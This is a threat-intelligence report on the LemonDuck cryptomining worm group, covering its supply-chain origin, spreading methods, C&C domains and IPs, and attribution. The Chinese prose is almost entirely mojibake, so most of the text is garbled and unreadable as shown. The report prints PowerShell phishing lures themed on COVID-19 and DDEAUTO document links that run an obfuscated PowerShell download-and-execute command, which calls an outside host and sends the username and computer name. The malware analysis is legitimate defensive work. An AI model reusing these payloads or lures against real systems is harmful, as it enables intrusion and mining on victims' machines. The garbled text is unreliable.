# èµ·åº•â€œAPTâ€æŒ–çŸ¿ç»„ç»‡â€”â€”â€œå°é»„é¸­â€LemonDuck



[TOC]



## æ‘˜è¦



è¿‘æœŸï¼Œæˆ‘ä»¬ç›‘æµ‹åˆ°å¤šèµ·åˆ©ç”¨é’“é±¼é‚®ä»¶ã€æ¼æ´åˆ©ç”¨ä¼ æ’­ï¼Œè¿›è¡ŒåŠ å¯†æ•°å­—è´§å¸æŒ–æ˜çš„è •è™«æ”»å‡»æ´»åŠ¨ã€‚

ç»ç ”ç©¶äººå‘˜åˆ†æåå°†è¿™ä¸€ç³»åˆ—æ”»å‡»æ´»åŠ¨å®šä¹‰ä¸ºå•†ä¸šåŒ–APTè¡Œä¸ºï¼Œæˆ‘ä»¬å°†è¿™ä¸€ç³»åˆ—æ´»åŠ¨èƒŒåçš„ç»„ç»‡å‘½åä¸ºâ€œå°é»„é¸­â€ã€‚ï¼ˆ[å…³äºå‘½åç”±æ¥ï¼Œåæ–‡ä¸“é—¨æåŠ](#å…³äºå‘½åä¸ºå•¥å«å°é»„é¸­)ï¼‰

ä¸åŒäºä»¥å¾€å‘ç°çš„åŒç±»å‹æ”»å‡»ï¼Œè¯¥æ”»å‡»æ´»åŠ¨å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š

*   èµ·æºäºé’ˆå¯¹â€œé©±åŠ¨äººç”Ÿâ€ä¾›åº”é“¾çš„APTæ”»å‡»ï¼›
*   æŒç»­æ—¶é—´é•¿ï¼Œä»2018å¹´12æœˆä»½èµ·æŒç»­è‡³ä»Šï¼›
*   å½±å“èŒƒå›´å¹¿æ³›ï¼Œæ³¢åŠå…¨çƒï¼Œå·²æœ‰æ•°ç™¾ä¸‡è®¾å¤‡è¢«æ„ŸæŸ“ï¼›
*   ä¼ æ’­é€”å¾„å¤šæ ·ï¼Œé€šè¿‡æ¼æ´åˆ©ç”¨ã€Outlooké‚®ä»¶ã€ç§»åŠ¨å­˜å‚¨è®¾å¤‡è¿›è¡Œä¼ æ’­ï¼›
*   åˆ©ç”¨æ–°å† ç–«æƒ…å¯¹é‚®ä»¶æ”»å‡»æ¨¡å—åšé’ˆå¯¹æ€§å‡çº§ï¼Œä»¥æé«˜æ„ŸæŸ“æ•ˆç‡ï¼›
*   é¢‘ç¹åˆ©ç”¨å¼€æºé¡¹ç›®åŠæ–°æŠ«éœ²æ¼æ´çš„POCæ¥å¢å¼ºè •è™«æ„ŸæŸ“èƒ½åŠ›ï¼›
*   å¤šæ ·æ€§ï¼Œè¿­ä»£/å‡çº§çš„é¢‘ç‡è¿œè¶…ä»¥å¾€å‘ç°çš„åŒç±»å‹å¨èƒæ”»å‡»ã€‚

ä¸ä»¥å¾€å¤§éƒ¨åˆ†APTæ”»å‡»æ´»åŠ¨ç›®çš„ä¸ºçªƒå–æ•æ„Ÿèµ„æ–™ã€ç ´åå…³é”®è®¾æ–½ç­‰ä¸åŒï¼Œâ€œå°é»„é¸­â€æ”»å‡»ä¼¼ä¹ä»…ä»¥ç»æµåˆ©ç›Šä¸ºç›®çš„ï¼š

é€šè¿‡æ§åˆ¶è®¡ç®—æœºã€ä¾µå è®¡ç®—èµ„ç”¨äºåŠ å¯†æ•°å­—è´§å¸çš„æŒ–æ˜ã€‚

â€œå°é»„é¸­â€æœ€åˆç”±é’ˆå¯¹â€œé©±åŠ¨äººç”Ÿâ€å‘èµ·çš„APTæ”»å‡»æ¼”å˜è€Œæ¥ï¼Œä½†ç ”ç©¶åå‘ç°ï¼Œæ”»å‡»è€…å¯èƒ½åªæ˜¯å¸Œæœ›åˆ©ç”¨â€œé©±åŠ¨äººç”Ÿâ€ä½œä¸ºè·³æ¿ï¼Œä½¿è •è™«å°½å¯èƒ½å¹¿æ³›åœ°ä¼ æ’­ã€‚

æ”»å‡»è€…ç–‘ä¼¼ä¸ºå…·æœ‰ä¸€å®šä¸“ä¸šèƒ½åŠ›çš„å¢ƒå¤–ç»„ç»‡ï¼Œå‘èµ·æˆ–å‚ä¸è¿‡å¤§è§„æ¨¡ç½‘ç»œæ”»å‡»ç›¸å…³æ´»åŠ¨ï¼ˆå¦‚æ„å»ºåƒµå°¸ç½‘ç»œç­‰ï¼‰ã€‚

è‡³ä»Šâ€œå°é»„é¸­â€å·²å‘å±•æˆé¢å‘å…¨çƒï¼Œä¸»è¦é’ˆå¯¹è¿è¡ŒWindowsç³»ç»Ÿçš„ç»ˆç«¯è®¾å¤‡çš„æœ‰ç»„ç»‡ã€æœ‰è®¡åˆ’çš„ã€ä»¥æŒ–çŸ¿ä¸ºç›®çš„é«˜çº§é•¿æœŸå¨èƒç»„ç»‡ã€‚

å½“å‰åœ¨å›½å†…ä»å‘ç°å¤§é‡ä¸ªäººPCåŠå¤šå®¶çŸ¥åä¼ä¸šè¢«æ„ŸæŸ“çš„æƒ…å†µã€‚

å…¶æ„ŸæŸ“ç›®æ ‡å·²ä¸é™äºWindowsä¸»æœºï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†è¿è¡ŒåµŒå…¥å¼Windows 7ç³»ç»Ÿçš„IoTè®¾å¤‡åŒæ ·å—åˆ°æ³¢åŠï¼Œæ™ºèƒ½ç”µè§†ï¼Œæ™ºèƒ½æ‰«æä»ªï¼Œå·¥ä¸šAGVç­‰ï¼Œå¹¶åœ¨è¿‘æœŸæ–°å¢äº†é’ˆå¯¹Linuxè®¾å¤‡çš„æ”»å‡»æ¨¡å—ã€‚

å—åˆ°æ„ŸæŸ“çš„æœºå™¨ä¸­ç»å¤§éƒ¨åˆ†æ¥è‡ªäºæ”¿åºœä¸ä¼ä¸šã€‚

å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œâ€œå°é»„é¸­â€å‘åŠ¨çš„æ”»å‡»ä¸­ä¸Šä¼ äº†ååˆ†è¯¦å°½çš„ç³»ç»Ÿç¯å¢ƒä¿¡æ¯ï¼Œè¿™æˆ–ä¸ºå…¶ç­›é€‰â€œç‰¹å®šç›®æ ‡â€è¿›è¡Œä¸‹ä¸€æ­¥å®šå‘æ”»å‡»è€Œåšå¥½äº†å‡†å¤‡ã€‚

>    è¿™æ„å‘³ç€ï¼Œâ€œé©±åŠ¨äººç”Ÿâ€é­å—å®šå‘æ”»å‡»åŒç±»äº‹ä»¶æˆ–å°†é‡æ¼”â€¦â€¦

é€šè¿‡å¯¹ç›¸å…³æƒ…æŠ¥çš„å…³è”åˆ†æåå‘ç°ï¼š

å›½å†…å¤–å¤šå®¶å®‰å…¨å‚å•†æ‰€è¿°çš„â€œæ°¸æ’ä¹‹è“â€ä¸‹è½½å™¨ï¼Œè“èŒ¶ï¼ŒMTLminerï¼Œâ€œé©±åŠ¨â¼ˆâ½£â€â½†â½‚ä»¶æŒ–çŸ¿ï¼ŒBeapyï¼ŒLemonDuckï¼ŒæŸ æª¬é¸­ç›¸å…³æ”»å‡»æ´»åŠ¨ï¼Œå‡ä¸ºâ€œå°é»„é¸­â€æ‰€ä¸ºã€‚



## ç®€è¦åˆ†æ



ä»¥ä¸‹æ˜¯â€œå°é»„é¸­â€æ•´ä¸ªçš„æ”»å‡»é“¾è·¯å›¾ï¼š

<img src="./README.assets/20200611Lemon_duck.png" alt="killchain" style="zoom:50%;" />



ä¸åŒäºå¸¸è§„çš„æ”»å‡»é“¾è·¯ï¼Œå…¶æ”»å‡»é“¾è·¯ä¸­ï¼š

å…·æœ‰å¤§é‡çš„è¿œç¨‹æ¶æ„æ–‡ä»¶æ‰§è¡Œæ“ä½œï¼Œä¸”ç›¸äº’ä¹‹é—´å…·æœ‰é€’å½’/åµŒå¥—æ‰§è¡Œçš„ç‰¹ç‚¹ã€‚

å…¶æ¶æ„è„šæœ¬ç»è¿‡äº†ç›¸å½“å¤æ‚çš„åŠ å¯†å’Œæ··æ·†ï¼ˆè¿™å¸®åŠ©å…¶è§„é¿ç»å¤§éƒ¨åˆ†çš„å¼•æ“æŸ¥æ€ï¼‰ã€‚

<img src="./README.assets/20200611image-20200521165523747.png" style="zoom:40%;" />

å…¶è¿œç¨‹è„šæœ¬åä¼ªè£…æˆä¸€äº›æ™®é€šçš„å‰ç«¯é¡µé¢åç¼€ï¼ˆå¦‚ï¼šPHPï¼ŒJSï¼ŒJSPï¼ŒJSONï¼ŒPNG...ï¼‰

ä¸åŒçš„æ„ŸæŸ“è·¯å¾„ä¼šè§¦å‘è¯·æ±‚ä¸åŒåç§°çš„è¿œç¨‹è„šæœ¬ï¼Œè¿™èµ·åˆ°ä¸€ä¸ªMonitorçš„ä½œç”¨ã€‚

>   å­˜åœ¨å¤šä¸ªå‘½åä¸åŒçš„æ”»å‡»è„šæœ¬ï¼Œä½†å…¶å†…å®¹å®Œå…¨ä¸€è‡´çš„æƒ…å†µã€‚



å…¶æ”»å‡»é“¾ä¸»è¦é€šè¿‡è®¡åˆ’ä»»åŠ¡ï¼Œå®ç°åœ¨ç³»ç»Ÿä¸­çš„æ›´æ–°ä¸æŒä¹…åŒ–ï¼š

é€šè¿‡åˆ›å»ºéšæœºå‘½åçš„å®šæ—¶ä»»åŠ¡ï¼Œæ¯å°æ—¶ä»C&CæœåŠ¡å™¨è·å–ä»£ç å¹¶æ‰§è¡Œï¼Œæ¥è§¦å‘è¿œç¨‹ä»£ç ä¸­å†™å…¥çš„æŒ–çŸ¿ä¸ä¼ æ’­æ“ä½œã€‚

è¿™ç§è®¡åˆ’ä»»åŠ¡é…åˆè¿œç¨‹æ–‡ä»¶åŠ è½½æ‰§è¡Œçš„æ–¹å¼ï¼Œä½¿å¾—æ›´æ–°åçš„è¿œç¨‹æ¶æ„è„šæœ¬ä¼šåœ¨å·²æ„ŸæŸ“æœºå™¨å†æ¬¡æ‰§è¡Œã€‚

æ”»å‡»è€…ä¸€ç›´åœ¨æ ¹æ®æ”»å‡»é“¾è·¯ä¸­åé¦ˆç»™C&CæœåŠ¡å™¨çš„ä¿¡æ¯ï¼ˆæœ‰å…³ç”¨æˆ·å¸æˆ·ï¼Œç¯å¢ƒä¿¡æ¯ï¼Œæƒé™ä»¥åŠæ¶æ„è´Ÿè½½æ‰§è¡ŒçŠ¶å†µçš„è¯¦ç»†ä¿¡æ¯ï¼‰ï¼Œä¸æ–­åœ°å¯¹ç¯èŠ‚åŠæµç¨‹è¿›è¡Œè°ƒæ•´å’Œä¼˜åŒ–ã€‚

åœ¨è¿‘ä¸¤æœˆçš„ç›‘æµ‹å‘¨æœŸä¸­ï¼Œå·²ç»æ•è·åˆ°æ•°åæ¬¡æ”»å‡»é“¾çš„æ›´æ–°ã€‚

å…¶ä¸»è¦ä¼ æ’­é€”å¾„å¯åˆ†ä¸ºä¸‰ç±»ï¼š

*   é€šè¿‡æ¼æ´åˆ©ç”¨ä¼ æ’­ï¼š

    *   ç«¯å£æ‰«æ
    *   EternalBlue/MS17-010  é’ˆå¯¹Win7/Win8
    *   CVE-2020-0796  ï¼ˆ2020å¹´4æœˆæ–°å¢ï¼‰
    *   æš´åŠ›ç ´è§£ï¼ˆé™¤è‡ªèº«æºå¸¦å­—å…¸å¤–ï¼Œè¿˜ä¼šå°†è·å–æœ¬åœ°å£ä»¤/å‡­è¯åŠ å…¥å­—å…¸ï¼‰
        *   $IPC
        *   SMB
        *   MS-SQL
        *   RDP
        *   NTLM
        *   WMI
        *   SSHï¼ˆ2020-06-01æ–°å¢ï¼Œé’ˆå¯¹Linux rootè´¦å·ï¼‰

*   åˆ©ç”¨ç§»åŠ¨å­˜å‚¨è®¾å¤‡ä¼ æ’­ ï¼ˆCVE-2017-8464ï¼‰ï¼š

    *    é€šè¿‡å°†æ¶æ„DLLä¸å¿«æ·æ–¹å¼ï¼ˆLNKï¼‰æ–‡ä»¶ä¸€èµ·æ¤å…¥æ–‡ä»¶å¤¹ä¸­ï¼Œä»è€Œæ„ŸæŸ“å¯ç§»åŠ¨USBé©±åŠ¨å™¨å’Œç½‘ç»œé©±åŠ¨å™¨ã€‚

         >   å½“åœ¨ä¼šè§£æ.lnkå¿«æ·æ–¹å¼æ–‡ä»¶çš„ä»»ä½•åº”ç”¨ç¨‹åºä¸­æ‰“å¼€é©±åŠ¨å™¨æ—¶ï¼Œå¿«æ·æ–¹å¼å°†æ‰§è¡Œæ¶æ„çš„DLLç»„ä»¶ã€‚

*   åˆ©ç”¨Outlooké‚®ä»¶ä¼ æ’­/ç¤¾ä¼šå·¥ç¨‹å­¦ä¼ æ’­ï¼š

    *   å€ŸåŠ©æ–°å† ç–«æƒ…ï¼Œæ–°å¢éƒ¨åˆ†ä¸æ–°å† æœ‰å…³é‚®ä»¶ä¸»é¢˜

    *   éšæœºé€‰å–é‚®ä»¶ä¸»é¢˜åŠå†…å®¹ï¼Œå‘é€ç»™æ„ŸæŸ“ä¸»æœºä¸Šçš„æ‰€æœ‰Outlookè”ç³»äºº
    *   ç”Ÿæˆæ¶æ„æ–‡æ¡£ï¼ˆCVE-2017-8570ï¼ŒDDEï¼‰ï¼Œæ¶æ„JSæ–‡ä»¶



å…¶å…ˆå‰åˆ©ç”¨Outlookè¿›è¡Œçš„ä¼ æ’­è¿‡ç¨‹ä¸­ï¼Œæ•è·çš„æ ·æœ¬ä¸­é‚®ä»¶ä¸»é¢˜æ˜¯å”¯ä¸€çš„ï¼Œç›´æ¥ç¡¬ç¼–ç åœ¨è„šæœ¬ä¸­ï¼š

```powershell
$mail_subject="The Truth of COVID-19 ????????????"
$mail_body="Virus actually comes from United States of America"
```

è€Œè¿‘æœŸä¸€æ¬¡æ›´æ–°ä¸­ï¼š

å…¶åœ¨åˆ©ç”¨é‚®ä»¶ä¼ æ’­çš„æ”»å‡»æ¨¡å—ä¸­åŒ…å«äº†ä»¥ä¸‹å¤šä¸ªé‚®ä»¶ä¸»é¢˜ï¼ŒéšæœºæŒ‘é€‰å…¶ä¸­ä¹‹ä¸€ï¼ˆå…¶ä¸­å·²ç»æ–°å¢äº†ä¸¤ä¸ªä¸æ–°å† æœ‰å…³çš„ä¸»é¢˜ï¼‰ï¼š

```powershell
$global:mail_pools=@(
# ä¸æ–°å† å…³
("The Truth of COVID-19","Virus actually comes from United States of America"),
("COVID-19 nCov Special info WHO","very important infomation for Covid-19see attached document for your action and discretion."),
("HALTH ADVISORY:CORONA VIRUS","the outbreak of CORONA VIRUS is cause of concern especially where forign personal have recently arrived or will be arriving at various intt in near future.see attached document for your action and discretion."),

("WTF","what's wrong with you?are you out of your mind!!!!!"),
("What the fcuk","are you out of your mind!!!!!what 's wrong with you?"),
("good bye","good bye, keep in touch"),
("farewell letter","good bye, keep in touch"),
("broken file","can you help me to fix the file,i can't read it"),
("This is your order?","file is brokened, i can't open it")
)
```

æ¶æ„RTFæ–‡æ¡£æ‰“å¼€åçš„æˆªå›¾ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

<img src="./README.assets/20200611image-20200507152621697.png" style="zoom:30%;" />



### æ”»å‡»èµ·æº



â€œå°é»„é¸­â€æœ€æ—©çš„æ”»å‡»æ´»åŠ¨å¯è¿½æº¯åˆ°2018å¹´11æœˆçš„ä¸€èµ·é’ˆå¯¹æ€§æ”»å‡»äº‹ä»¶ï¼š

**2018å¹´11æœˆ12æ—¥ 10:53åˆ†ï¼š**

é©±åŠ¨äººç”Ÿçš„ä¸€å°è¿ç»´è·³æ¿æœºå‡ºç°å¼‚å¸¸è¿œç¨‹ç™»å½•â€¦â€¦ï¼ˆæ¨æµ‹åº”è¯¥æ˜¯ä¹‹å‰è¢«åƒµå°¸ç½‘ç»œæ„ŸæŸ“ï¼Œè€Œåè¢«é’ˆå¯¹æ€§æŒç»­æ¸—é€ï¼‰

**11æœˆ15æ—¥ 17:17åˆ†ï¼š**

æ”»å‡»è€…é€šè¿‡å¤šå±‚å†…ç½‘æ¸—é€ï¼ŒæˆåŠŸè·å–å‡çº§æœåŠ¡å™¨ï¼ˆ103.56.77.23 , globalupdate.updrv.comï¼‰å£ä»¤å¹¶ç™»å½•ã€‚

**12æœˆ 2æ—¥è‡³5æ—¥ï¼š**

ç”¨äºæ”»å‡»çš„åŸŸåè¢«æ³¨å†Œï¼š

```
haqo.net  2018-12-02T14:35:52Z 
abbny.com 2018-12-03T04:06:07Z 
ackng.com 2018-12-05T06:58:03Z 
```

æ³¨å†Œæ—¶é—´æ®µå¤§æ¦‚æ˜¯åŒ—äº¬æ—¶é—´12ç‚¹-22ç‚¹ï¼Œæ¥è‡ªäºä¸‰ä¸ªä¸ç”¨çš„åŸŸåä¾›åº”å•†ã€‚

æˆ‘ä»¬ç›‘æµ‹åˆ°çš„è¿œç¨‹è„šæœ¬çš„æ›´æ–°æ—¶é—´èŒƒå›´ä¸º10ç‚¹-20ç‚¹ï¼Œè¿™ä¸¤ç‚¹è¡¨æ˜äº†æ”»å‡»è€…çš„æ´»åŠ¨æ—¶é—´èŒƒå›´ã€‚

**12æœˆ14æ—¥ 14:15åˆ†ï¼š**

æ”»å‡»è€…åˆ©ç”¨ä»£ç† `84.39.112.58`ï¼ˆğŸ“ç‘å£«ï¼‰è¿œç¨‹ç™»å½•åˆ°å‡çº§æœåŠ¡å™¨`103.56.77.23`

å¤‡ä»½å¹¶ä¿®æ”¹`ServerConfig.xml`æ–‡ä»¶ï¼Œç™»å½•SQLæ•°æ®åº“åæ’å…¥å…¶å‡†å¤‡å¥½çš„æ¶æ„ä¸‹è½½é“¾æ¥

éšåäºå½“å¤©çº¦18:00åˆ é™¤

å€Ÿæ­¤ï¼ŒçŸ­çŸ­ä¸åˆ°4ä¸ªå°æ—¶çš„æ—¶é—´å†…ï¼Œå¤šè¾¾æ•°åä¸‡å°PCå—åˆ°æ„ŸæŸ“ã€‚

>    æŒ‰ç…§å½“æ—¶çš„Menoå¸ä»·æ ¼æ¯10ä¸‡å°åƒµå°¸ä¸»æœºï¼Œé¢„è®¡æ¯æœˆä¼šä¸ºæ”»å‡»è€…å¸¦æ¥è¿‘åƒç¾å…ƒçš„æ”¶ç›Š



å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ¬¡æ”»å‡»æ˜¾ç„¶ä¸æ˜¯æœ‰å¤‡è€Œæ¥ã€‚

åœ¨æˆåŠŸå…¥ä¾µé©±åŠ¨äººç”Ÿå‡çº§æœåŠ¡å™¨åï¼Œæ”»å‡»è€…åœ¨å—å®³è€…å†…ç½‘æ½œä¼äº†è¿‘ä¸€ä¸ªæœˆçš„æ—¶é—´ã€‚

è€Œåæ‰æ³¨å†Œç›¸å…³åŸŸåï¼Œä¸ºâ€œæ”»å‡»æµ‹è¯•â€åšå‡†å¤‡ï¼Œä¸”åœ¨æ”»å‡»ç”Ÿæ•ˆåç«‹å³æ¢å¤äº†æœåŠ¡å™¨ç›¸å…³è®¾ç½®ã€‚

ä»¥ä¸Šè¡Œä¸ºä¼¼ä¹è¡¨éœ²äº†æ­¤æ¬¡æ”»å‡»å¹¶éæœ‰å¤‡è€Œæ¥ï¼Œæ”»å‡»è€…å½“æ—¶å¹¶æœªå‡†å¤‡å¥½æ­¤æ¬¡å¤§è§„æ¨¡è •è™«æ”»å‡»ã€‚

ä¹Ÿè®¸æ˜¯åœ¨è¿™æ¬¡â€œæµ‹è¯•æ”»å‡»â€ä¸­ï¼Œè·å–äº†ä¸è²çš„æ”¶ç›Šï¼š

æ”»å‡»è€…åœ¨2018å¹´12æœˆ19æ—¥ï¼Œæ›´æ–°æ¶æ„ç¨‹åºï¼šæ–°å¢powershellåé—¨ï¼Œä»¥åšæƒé™ç»´æŒï¼ŒåŠæ–¹ä¾¿åç»­æ›´æ–°ã€‚

æ­¤åâ€œå°é»„é¸­â€å˜å¾—ä¸€å‘ä¸å¯æ”¶æ‹¾ï¼Œå…¶æ”»å‡»æ´»åŠ¨åœ¨æœ¬æŠ¥å‘Šæˆªæ­¢ï¼ˆ2020-06-13ï¼‰æ—¶ä»ååˆ†æ´»è·ƒï¼ŒæœŸé—´å·²ç»å†äº†æ•°ç™¾æ¬¡çš„æ›´æ–°å‡çº§ï¼ˆå›½å†…å¤–å·²æœ‰å¤šè¾¾æ•°åç¯‡ä¸å…¶ç›¸å…³çš„æŠ¥å‘Šâ€¦â€¦ï¼‰



ä»¥ä¸‹æ˜¯æˆ‘ä»¬è¿‘æœŸç›‘æµ‹åˆ°çš„â€œå°é»„é¸­â€æ”»å‡»é“¾éƒ¨åˆ†å˜åŠ¨æ›´æ–°çŠ¶å†µï¼š

### è¿‘æœŸå˜åŠ¨

**2020-04-27:**

â€‹	é‚®ä»¶ä¸­åŒ…å«çš„RTFæ–‡æ¡£æ›´æ–°äº†DDEé“¾æ¥ï¼ŒDDEåŠ è½½å¯¹è±¡ç”±è¿œç¨‹æ–‡ä»¶å˜ä¸ºæœ¬åœ°æ–‡ä»¶ï¼Œè¿™å¸®åŠ©å…¶æˆåŠŸè§„é¿æ‰éƒ¨åˆ†æ²™ç®±	æ£€æµ‹è§„åˆ™ã€‚

â€‹	DDEé“¾æ¥å¯¹æ¯”å¦‚ä¸‹ï¼š

```powershell
 Opening file: readme.doc
 DDE Links:
 DDEAUTO      "     C:\\Programs\\Microsoft\\Office    \\ 12    \\ MSWord\\..\\..\\..\\..\\..\\Windows\\system32\\cmd.exe /c      powershell [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:%tmp%wxJadS9Xyg.sct').Exec(0)&"      "Microsoft Office Remote  Database"
 
 Opening file: urgent.doc
 DDE Links:
 DDEAUTO      "     C:\\Programs\\Microsoft\\Office    \\ 12    \\ MSWord\\..\\..\\..\\..\\..\\Windows\\system32\\cmd.exe /c      powershell IE`x(Ne`w-Obj`ect Net.WebC`lient).DownLoadString('http://t.awcna.com/mail.jsp?dde*%username%*%computername%')&"      "Microsoft Office Remote  Database"
```



**2020-05-19 :**

â€‹	C&CåŸŸå`tr2q.com`åœæ­¢è§£æ ï¼Œæ–°å¢`zer9g.com`

â€‹	ä»å¯é€šè¿‡IP: `66.42.43.37`è®¿é—®ï¼Œç”±äºHostsæ–‡ä»¶ä¿®æ”¹ï¼Œä¸ä¼šå¯¹å·²ç»æ„ŸæŸ“çš„æœºå™¨äº§ç”Ÿå½±å“

**2020-05-21ï¼š**

â€‹	è¿œç¨‹è„šæœ¬å…¨çº¿æ›´æ–°ï¼ŒBase64ç¼–ç åŠ å¯†æ›¿æ¢ä¸ºMemoryStreamï¼Œæ–‡ä»¶ä½“ç§¯å˜å¤§ï¼Œåˆ†æéš¾åº¦æé«˜ï¼ŒæŸ¥æ€ç‡é™ä½ã€‚

â€‹	æ›´æ–°å‰ï¼š

<img src="./README.assets/20200611image-20200521154831683.png" alt="image-20200521154831683" style="zoom:50%;" />



â€‹	æ›´æ–°åï¼š

<img src="./README.assets/20200611image-20200521165523747.png" alt="image-20200521165523747" style="zoom:50%;" />



**2020-06-01:**

â€‹	ä¸»è¦æ”»å‡»æ¨¡å—`if.bin`ä¸­æ–°å¢äº†å¯¹äºLinux SSHçˆ†ç ´åŠŸèƒ½

â€‹	é€šè¿‡ä½¿ç”¨PuTTY linkå·¥å…·ï¼Œå³`plink.exe`å¯¹å±€åŸŸç½‘å†…22ç«¯å£è¿›è¡Œrootè´¦å·å­—å…¸çˆ†ã€‚

â€‹	è‹¥SSHçˆ†ç ´æˆåŠŸåï¼Œä¼šåœ¨ç›®å½•ï¼š`/.Xll/xr `å†™å…¥æŒ–çŸ¿ç¨‹åºï¼Œå¹¶åŠ å…¥crontabå®šæ—¶æ‰§è¡Œ ã€‚

â€‹	

### æº¯æºåˆ†æ



åœ¨é’ˆå¯¹æ ·æœ¬ä¸­æ¶‰åŠçš„åŸŸååŠå…¶è§£æIPçš„å…³è”åˆ†æä¸­å‘ç°ï¼š

æ”»å‡»è€…å¯¹äºåŸŸåä¸æœåŠ¡å™¨ä¾›åº”å•†é€‰æ‹©çš„ç¦»æ•£åº¦å¾ˆé«˜ï¼Œè¿™å¢åŠ æ¥ç®¡åŠå…³åœå…¶é»‘è‰²èµ„äº§çš„éš¾åº¦ï¼Œä¸ºæ”»å‡»æ´»åŠ¨æä¾›ç¼“å†²æœŸï¼Œä¾¿äºå…¶åˆ‡æ¢å’Œè¿ç§»é»‘è‰²èµ„äº§ã€‚

<img src="./README.assets/20200611Lemon_Duck-Domain-1082570.png" alt="Lemon_Duck-Domain" style="zoom:50%;" />

å›¾ä¸­æ ‡çº¢çš„åŸŸåä¸ºé¦–æ¬¡æµ‹è¯•æ”»å‡»æ‰€ä½¿ç”¨ï¼Œä¸”ackng.comä¸€ç›´æ²¿ç”¨è‡³ä»Šã€‚

å…¶è¿‘æœŸæ´»åŠ¨ä¸­åå¥½çš„åŸŸåæ³¨å†Œå•†ä¸ºï¼šhttps://www.epik.com

åœ¨æ ·æœ¬ç›‘æµ‹ä¸­æˆ‘ä»¬å‘ç°ï¼š

çŸ­æ—¶é—´å†…å¤šæ¬¡å¯¹åŒä¸€è„šæœ¬å‘èµ·è¯·æ±‚ï¼Œå¾—åˆ°åŒMD5æ–‡ä»¶ä½†å…¶ä¿®æ”¹æ—¶é—´å…·æœ‰å¾®å°çš„æ—¶é—´å·®ï¼Œ

å…¶C&CæœåŠ¡å™¨çš„èƒŒåå¯èƒ½ä½¿ç”¨äº†è´Ÿè½½å‡è¡¡ç›¸å…³çš„æœºåˆ¶æ¥ä¿éšœC&Cçš„æ­£å¸¸æœåŠ¡ã€‚



æˆ‘ä»¬æ³¨æ„åˆ°å†å²ä¸Šâ€œå°é»„é¸­â€ä½¿ç”¨çš„æŸäº›C&CåŸŸåå…³è”å­åŸŸåçš„è§£æIP:

```powershell
js.haqo.net 81.177.135.35
```

ä¸æš—äº‘III v3.0 ã€Mykingsã€Miraiã€Smominruåƒµå°¸ç½‘ç»œç›¸å…³æ´»åŠ¨æœ‰å…³è”ã€‚



ç»è¿‡è°ƒæŸ¥å‘ç°ï¼š

åˆæœŸâ€œå°é»„é¸­â€çš„æ”»å‡»æ¨¡å¼ä¸Mykingså…·æœ‰ä¸€å®šç›¸ä¼¼æ€§ï¼Œè¿™è¡¨æ˜â€œå°é»„é¸­â€çš„æ”»å‡»æ¨¡å¼æˆ–å—å…¶å¯å‘ã€‚

è€Œåâ€œå°é»„é¸­â€æ•…æ„äº†åˆ›å»ºéƒ¨åˆ†å­åŸŸåï¼Œå°†å…¶è§£æåœ¨ä¸Mykingsçš„èµ„äº§ç›¸å…³è”IPåœ°å€ä¸Šï¼Œä»è€Œæ··æ·†å®‰å…¨åˆ†æçš„è°ƒæŸ¥æ–¹å‘ã€‚

>    è¿™éƒ¨åˆ†è§£æåœ¨Mykings IPä¸Šçš„å­åŸŸåæ— æ³•åƒå…¶ä»–å­åŸŸåä¸€æ ·æä¾›æ­£å¸¸çš„C&CæœåŠ¡



æˆ‘ä»¬è°ƒæŸ¥äº†è¯¥ç»„ç»‡åœ¨åˆæœŸæ”»å‡»æ—¶ä½¿ç”¨çš„å„ç±»èµ„äº§ï¼Œæƒ³ä»ä¸­æ‰¾å‡ºä¸è¯¥æ”»å‡»æ´»åŠ¨æœ‰å…³çš„å…¶ä»–æ”»å‡»æ´»åŠ¨ï¼š

```
# domain
abbny.com
haqo.net
ackng.com #(è¯¥åŸŸåæ²¿ç”¨è‡³ä»Šï¼‰

# C&C
45.118.132.44
172.105.237.31
27.102.113.141

# çŸ¿æ± 
172.105.204.237

# Proxy
84.39.112.58
95.211.168.228
```

é—æ†¾çš„æ˜¯ï¼Œæ”»å‡»è€…æ‰€ç”¨èµ„äº§å‡ ä¹å…¨éƒ¨æ˜¯ç¬¬ä¸€æ¬¡å¯ç”¨ï¼Œä¸”ä¾›åº”å•†å„ä¸ç›¸åŒï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ²¡æœ‰å–å¾—ä»»ä½•æœ‰ä»·å€¼çš„å‘ç°ã€‚



é€šè¿‡è¿½æº¯å…¶ä¸åŒæ—¶æœŸæ”»å‡»é“¾çš„å˜åŠ¨ï¼Œæˆ‘ä»¬å‘ç°ï¼š

å„å®‰å…¨å‚å•†æ‰€æŠ¥â€œæ°¸æ’ä¹‹è“â€ä¸‹è½½å™¨ï¼Œè“èŒ¶ï¼ŒMTLminerï¼Œâ€œé©±åŠ¨äººç”Ÿâ€æ— æ–‡ä»¶æŒ–çŸ¿ï¼ŒBeapyï¼ŒLemonDuckï¼ŒæŸ æª¬é¸­ç›¸å…³æ”»å‡»æ´»åŠ¨å‡ä¸ºâ€œå°é»„é¸­â€æ‰€ä¸ºã€‚

è¯¥å›¢ä¼™å…·å¤‡è¾ƒé«˜çš„å®‰å…¨æ°´å¹³åŠå¿«é€Ÿå­¦ä¹ çš„èƒ½åŠ›ï¼Œåœ¨é¦–æ¬¡æ”»å‡»å‰åº”å‚ä¸æˆ–äº†è§£è¿‡å¤§é¢ç§¯ç½‘ç»œæ”»å‡»ç›¸å…³æ´»åŠ¨ï¼ˆå¦‚ï¼šæ„å»ºåƒµå°¸ç½‘ç»œï¼‰ã€‚

æ›´ç”šè€…ï¼Œå­˜åœ¨ç”±ä»äº‹ç½‘ç»œå®‰å…¨ç›¸å…³å·¥ä½œçš„äººå‘˜ï¼Œä»¥è°‹æ±‚ç»æµåˆ©ç›Šä¸ºç›®çš„ï¼Œåœ¨æŸäº›ä¾¿åˆ©ç¯å¢ƒçš„è¯±ä½¿ä¸‹ï¼Œåˆ©ç”¨ç›¸å…³è¡Œä¸šç»éªŒå‘èµ·çš„ç½‘ç»œæ”»å‡»çš„å¯èƒ½ã€‚



